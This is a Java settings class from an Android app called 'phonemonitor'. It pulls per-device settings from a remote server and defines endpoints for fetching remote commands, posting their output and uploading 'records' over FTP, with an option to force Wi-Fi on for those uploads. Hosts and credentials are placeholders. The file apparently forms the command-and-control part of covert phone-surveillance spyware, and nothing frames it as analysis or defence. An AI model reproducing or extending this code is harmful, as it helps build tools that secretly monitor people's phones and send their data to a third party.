package com.monitor.phone.s0ft.phonemonitor;

import android.content.Context;
import android.net.Uri;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

class AppSettings {

    //tries to read settings from server. if successful, updates local settings file and returns the required setting. if failed to read from server,
    //tries to read from local settings file and return the required setting. if failed, returns failsafe version of the required setting

    private static final String TAG = "phonemonitor";

    private Context context;

    private static final String settingsFileName = "phonemonitorsettings.json";
    private static final String getSettingsURL = "http://XXXX.com/getsettings.php";

    private static final String reportURL = "http://XXXX.com/report.php";
    private static final String commandsURL = "http://XXXX.com/getcommands.php";
    private static final String outputURL = "http://XXXX.com/setoutput.php";
    private static final String ftpServer = "ftp.XXXX.com";
    private static final int ftpPort = 21;
    private static final String ftpUsername = "USERNAME";
    private static final String ftpPassword = "PASSWORD";

    private static final Boolean forceWifiOnForRecordUpload_failsafe = false;
    private static final int serverTalkInterval_failsafe = 1000;


    public AppSettings(Context context) {
        this.context = context;
    }

    public static String getTAG() {
        return TAG;
    }

    public static String getReportURL() {
        return reportURL;
    }

    public static String getCommandsURL() {
        return commandsURL;
    }

    public static String getOutputURL() {
        return outputURL;
    }

    public static String getFtpServer() {
        return ftpServer;
    }

    public static int getFtpPort() {
        return ftpPort;
    }

    public static String getFtpUsername() {
        return ftpUsername;
    }

    public static String getFtpPassword() {
        return ftpPassword;
    }

    public Boolean getForceWifiOnForRecordUpload() {
        Boolean retval = forceWifiOnForRecordUpload_failsafe;

        try {
            JSONObject settingsFromServer = readAndSaveSettingsFromServer();
            retval = settingsFromServer.getInt("ForceWifiOnForRecordUpload") == 1;
        } catch (Exception ex) {
            Log.w(TAG, "Failed to read setting from server at AppSettings.getForceWifiOnForRecordUpload()\n" + ex.getMessage());
            try {
                JSONObject localSavedSettings = readSettingsFromLocalFile();
                retval = localSavedSettings.getInt("ForceWifiOnForRecordUpload") == 1;
            } catch (Exception ex_) {
                Log.w(TAG, "Failed to read local setting at AppSettings.getForceWifiOnForRecordUpload()\n" + ex_.getMessage());
            }
        }

        return retval;
    }

    public int getServerTalkInterval() {
        int retval = serverTalkInterval_failsafe;

        try {
            JSONObject settingsFromServer = readAndSaveSettingsFromServer();
            retval = settingsFromServer.getInt("ServerTalkInterval");
        } catch (Exception ex) {
            Log.w(TAG, "Failed to read setting from server at AppSettings.getServerTalkInterval()\n" + ex.getMessage());
            try {
                JSONObject localSavedSettings = readSettingsFromLocalFile();
                retval = localSavedSettings.getInt("ServerTalkInterval");
            } catch (Exception ex_) {
                Log.w(TAG, "Failed to read local setting at AppSettings.getServerTalkInterval()\n" + ex_.getMessage());
            }
        }

        return retval;
    }

    private JSONObject readAndSaveSettingsFromServer() throws IOException, JSONException {
        //reads settings for this device from the server, saves locally and returns as JSONObject.
        JSONObject settings;


        URL url = new URL(getSettingsURL);
        HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setDoOutput(true);//we'll send the deviceUID to the server and we'll receive the corresponding settings
        httpURLConnection.setDoInput(true);
        httpURLConnection.setRequestProperty("User-Agent", "PhoneMonitor");
        httpURLConnection.setConnectTimeout(5000);
        httpURLConnection.setReadTimeout(5000);

        Uri.Builder builder = new Uri.Builder()
                .appendQueryParameter("uniqueid", HelperMethods.getDeviceUID(context));
        String GETQuery = builder.build().getEncodedQuery();

        OutputStream outputStream = httpURLConnection.getOutputStream();
        outputStream.write((byte[]) GETQuery.getBytes("UTF-8"));
        InputStream inputStream = httpURLConnection.getInputStream();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte byteread;
        while ((byteread = (byte) inputStream.read()) != -1) {
            byteArrayOutputStream.write(byteread);
        }
        String strSettings = byteArrayOutputStream.toString();
        outputStream.close();
        inputStream.close();
        httpURLConnection.disconnect();
        settings = new JSONObject(strSettings);

        //save to local file
        String settingsPath = context.getFilesDir().getAbsolutePath() + "/" + settingsFileName;
        File settingsfile = new File(settingsPath);
        if (settingsfile.exists()) settingsfile.delete();
        FileOutputStream fileOutputStream = new FileOutputStream(settingsfile);
        fileOutputStream.write(settings.toString().getBytes());
        fileOutputStream.close();


        return settings;
    }

    private JSONObject readSettingsFromLocalFile() throws IOException, JSONException {
        JSONObject retval;

        String settingsPath = context.getFilesDir().getAbsolutePath() + "/" + settingsFileName;
        FileInputStream fileInputStream = new FileInputStream(settingsPath);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte byteread;
        while ((byteread = (byte) fileInputStream.read()) != -1) {
            byteArrayOutputStream.write(byteread);
        }
        retval = new JSONObject(byteArrayOutputStream.toString());
        byteArrayOutputStream.close();
        fileInputStream.close();

        return retval;
    }


}